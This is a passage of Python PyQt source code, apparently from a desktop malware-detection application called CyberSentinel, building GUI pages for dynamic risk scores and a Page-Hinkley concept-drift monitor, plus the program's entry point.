        btn_row.addStretch()
        il.addLayout(btn_row)

        grp = QGroupBox("Recent Dynamic Risk Scores")
        gl  = QVBoxLayout(grp)
        self._drs_table = make_table(
            ["Timestamp", "File", "Base Verdict", "Base Score", "DRS", "Risk Level"],
            stretch_col=1
        )
        self._drs_table.itemSelectionChanged.connect(self._on_drs_row_selected)
        gl.addWidget(self._drs_table)
        il.addWidget(grp, 1)

        # Narrative detail
        self._drs_narrative = QTextEdit()
        self._drs_narrative.setReadOnly(True)
        self._drs_narrative.setFont(QFont("Consolas", 10))
        self._drs_narrative.setMaximumHeight(120)
        self._drs_narrative.setPlaceholderText("Select a row above to see the score breakdown...")
        self._drs_narrative.setStyleSheet(
            f"background: #0a0e14; color: {THEME['text']}; "
            f"border: 1px solid {THEME['border']}; border-radius: 4px;"
        )
        il.addWidget(self._drs_narrative)

        self._drs_rows_data = []
        layout.addWidget(inner, 1)
        QTimer.singleShot(300, self._refresh_risk_scores)
        return page

    def _refresh_risk_scores(self):
        try:
            from modules.risk_scorer import get_risk_scorer
            records = get_risk_scorer().get_recent_scores(limit=100)
            self._drs_rows_data = records

            counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}
            for r in records:
                lvl = r["risk_level"].lower()
                if lvl in counts:
                    counts[lvl] += 1
            for key, card in self._drs_cards.items():
                card.set_value(counts.get(key, 0))

            t = self._drs_table
            t.setRowCount(0)
            if not records:
                row = t.rowCount(); t.insertRow(row)
                t.setItem(row, 0, table_item(
                    "No risk scores yet. Scan a file with the ML engine.", THEME["muted"]
                ))
                for i in range(1, 6): t.setItem(row, i, table_item(""))
                return
            level_colors = {
                "CRITICAL": THEME["red"], "HIGH": THEME["yellow"],
                "MEDIUM": THEME["blue"],  "LOW":  THEME["green"],
            }
            for r in records:
                row = t.rowCount(); t.insertRow(row)
                t.setItem(row, 0, table_item(r["timestamp"]))
                t.setItem(row, 1, table_item(r["filename"]))
                vc = THEME["red"] if "CRITICAL" in (r["base_verdict"] or "") else THEME["text"]
                t.setItem(row, 2, table_item(r["base_verdict"], vc))
                t.setItem(row, 3, table_item(f"{r['base_score']:.3f}"))
                t.setItem(row, 4, table_item(f"{r['dynamic_score']:.3f}",
                    level_colors.get(r["risk_level"], THEME["text"])))
                t.setItem(row, 5, table_item(r["risk_level"],
                    level_colors.get(r["risk_level"], THEME["text"])))
        except Exception as e:
            pass

    def _on_drs_row_selected(self):
        row = self._drs_table.currentRow()
        if row < 0 or row >= len(self._drs_rows_data):
            return
        record = self._drs_rows_data[row]
        comps = record.get("components", {})
        lines = [
            f"Dynamic Risk Score: {record['dynamic_score']:.4f} — {record['risk_level']}",
            f"Base score: {record['base_score']:.4f}  File: {record['filename']}",
            "",
            "Component breakdown:",
        ]
        weight_map = {
            "verdict": "45%", "temporal": "10%", "active_threats": "15%",
            "chain_active": "15%", "network_activity": "10%", "baseline_miss": "5%",
        }
        for k, v in comps.items():
            w = weight_map.get(k, "")
            lines.append(f"  {k:<20} {v:.4f}  (weight {w})")
        self._drs_narrative.setPlainText("\n".join(lines))

    # ── PAGE: DRIFT MONITOR ───────────────────────────────────────────────────

    def _build_drift_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(self._page_header(
            "📉", "Concept Drift Monitor",
            "Statistical detection of ML model degradation — Page-Hinkley Test"
        ))

        inner = QWidget()
        il = QVBoxLayout(inner)
        il.setContentsMargins(24, 20, 24, 20)
        il.setSpacing(12)

        info = QLabel(
            "Concept drift occurs when malware evolves beyond the model's training data, "
            "causing its confidence to drop on threats it should recognize. "
            "The Page-Hinkley Test monitors the running score distribution and raises an "
            "alert when a statistically significant drop is detected. "
            "A drift alert is a signal to submit corrections and retrain the model."
        )
        info.setWordWrap(True)
        info.setStyleSheet(
            f"color: {THEME['muted']}; font-size: 11px; "
            f"background: {THEME['surface']}; border: 1px solid {THEME['border']}; "
            f"border-radius: 5px; padding: 10px;"
        )
        il.addWidget(info)

        # Status cards
        cards_row = QHBoxLayout()
        self._drift_cards = {}
        for label, key, color in [
            ("Observations",    "observations",      THEME["blue"]),
            ("Reference Mean",  "reference_mean",    THEME["green"]),
            ("PH Statistic",    "ph_statistic",      THEME["yellow"]),
            ("PH Threshold",    "ph_threshold",      THEME["muted"]),
        ]:
            card = StatCard(label, color)
            self._drift_cards[key] = card
            cards_row.addWidget(card)
        il.addLayout(cards_row)

        # Status indicator
        self._drift_status_lbl = QLabel("● Monitoring initializing...")
        self._drift_status_lbl.setStyleSheet(
            f"color: {THEME['muted']}; font-size: 11px; padding: 4px;"
        )
        il.addWidget(self._drift_status_lbl)

        btn_row = QHBoxLayout()
        refresh_btn = QPushButton("↻  Refresh")
        refresh_btn.setObjectName("primary")
        refresh_btn.setMinimumWidth(110)
        refresh_btn.clicked.connect(self._refresh_drift)
        btn_row.addWidget(refresh_btn)
        btn_row.addStretch()
        il.addLayout(btn_row)

        # Drift alert history
        grp1 = QGroupBox("Drift Alert History")
        g1l  = QVBoxLayout(grp1)
        self._drift_alert_table = make_table(
            ["Timestamp", "Method", "Ref Mean", "Current Mean", "Drift %", "Samples"],
            stretch_col=0
        )
        g1l.addWidget(self._drift_alert_table)
        il.addWidget(grp1)

        # Score history
        grp2 = QGroupBox("ML Score Log (recent malicious/suspicious verdicts)")
        g2l  = QVBoxLayout(grp2)
        self._drift_score_table = make_table(
            ["Timestamp", "File", "Verdict", "ML Score"],
            stretch_col=1
        )
        g2l.addWidget(self._drift_score_table)
        il.addWidget(grp2, 1)

        layout.addWidget(inner, 1)
        QTimer.singleShot(300, self._refresh_drift)
        return page

    def _refresh_drift(self):
        try:
            from modules.drift_detector import get_drift_detector
            det    = get_drift_detector()
            status = det.get_drift_status()

            for key, card in self._drift_cards.items():
                val = status.get(key, 0)
                if isinstance(val, float):
                    card.set_value(f"{val:.4f}")
                else:
                    card.set_value(val)

            if status.get("alert_active"):
                self._drift_status_lbl.setText(
                    "🔴 DRIFT ALERT ACTIVE — model degradation detected. Retrain recommended."
                )
                self._drift_status_lbl.setStyleSheet(
                    f"color: {THEME['red']}; font-size: 11px; font-weight: bold; padding: 4px;"
                )
            elif status.get("monitoring_active"):
                self._drift_status_lbl.setText(
                    f"● Monitoring active — {status['observations']} observations collected."
                )
                self._drift_status_lbl.setStyleSheet(
                    f"color: {THEME['green']}; font-size: 11px; padding: 4px;"
                )
            else:
                needed = 30 - status.get("observations", 0)
                self._drift_status_lbl.setText(
                    f"● Collecting reference window — {needed} more malicious scans needed to activate."
                )
                self._drift_status_lbl.setStyleSheet(
                    f"color: {THEME['muted']}; font-size: 11px; padding: 4px;"
                )

            # Drift alerts
            alerts = det.get_recent_alerts(limit=20)
            t = self._drift_alert_table
            t.setRowCount(0)
            if not alerts:
                row = t.rowCount(); t.insertRow(row)
                t.setItem(row, 0, table_item("No drift alerts detected — model performing normally.", THEME["green"]))
                for i in range(1, 6): t.setItem(row, i, table_item(""))
            else:
                for a in alerts:
                    row = t.rowCount(); t.insertRow(row)
                    t.setItem(row, 0, table_item(a["timestamp"]))
                    t.setItem(row, 1, table_item(a["alert_type"]))
                    t.setItem(row, 2, table_item(f"{a['reference_mean']:.4f}"))
                    t.setItem(row, 3, table_item(f"{a['current_mean']:.4f}", THEME["red"]))
                    t.setItem(row, 4, table_item(f"{a['drift_magnitude']:.1%}", THEME["red"]))
                    t.setItem(row, 5, table_item(str(a["samples_analyzed"])))

            # Score history
            scores = det.get_score_history(limit=50)
            t2 = self._drift_score_table
            t2.setRowCount(0)
            if not scores:
                row = t2.rowCount(); t2.insertRow(row)
                t2.setItem(row, 0, table_item("No ML scores logged yet. Scan files to populate.", THEME["muted"]))
                for i in range(1, 4): t2.setItem(row, i, table_item(""))
            else:
                for s in scores:
                    row = t2.rowCount(); t2.insertRow(row)
                    t2.setItem(row, 0, table_item(s["timestamp"]))
                    t2.setItem(row, 1, table_item(s["filename"]))
                    vc = THEME["red"] if "CRITICAL" in s["verdict"] else THEME["yellow"]
                    t2.setItem(row, 2, table_item(s["verdict"], vc))
                    t2.setItem(row, 3, table_item(f"{s['score']:.4f}",
                        THEME["red"] if s["score"] > 0.6 else THEME["text"]))
        except Exception as e:
            pass


# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

def main():
    app = QApplication(sys.argv)
    app.setApplicationName("CyberSentinel v1")

    # Dark palette
    palette = QPalette()
    palette.setColor(QPalette.ColorRole.Window,          QColor("#0d1117"))
    palette.setColor(QPalette.ColorRole.WindowText,      QColor("#c9d1d9"))
    palette.setColor(QPalette.ColorRole.Base,            QColor("#161b22"))
    palette.setColor(QPalette.ColorRole.AlternateBase,   QColor("#0d1117"))
    palette.setColor(QPalette.ColorRole.Text,            QColor("#c9d1d9"))
    palette.setColor(QPalette.ColorRole.Button,          QColor("#161b22"))
    palette.setColor(QPalette.ColorRole.ButtonText,      QColor("#c9d1d9"))
    palette.setColor(QPalette.ColorRole.Highlight,       QColor("#58a6ff"))
    palette.setColor(QPalette.ColorRole.HighlightedText, QColor("#0d1117"))
    app.setPalette(palette)

    window = CyberSentinelGUI()

    # Screen-adaptive sizing: use 90% of available screen, never smaller than 1100×700
    screen = app.primaryScreen()
    if screen:
        geom      = screen.availableGeometry()
        win_w     = max(1100, int(geom.width()  * 0.90))
        win_h     = max(700,  int(geom.height() * 0.90))
        win_x     = geom.x() + (geom.width()  - win_w) // 2
        win_y     = geom.y() + (geom.height() - win_h) // 2
        window.setGeometry(win_x, win_y, win_w, win_h)
    else:
        window.resize(1280, 800)

    window.show()
    window._show_page("dashboard")
    sys.exit(app.exec())


if __name__ == "__main__":
    main()
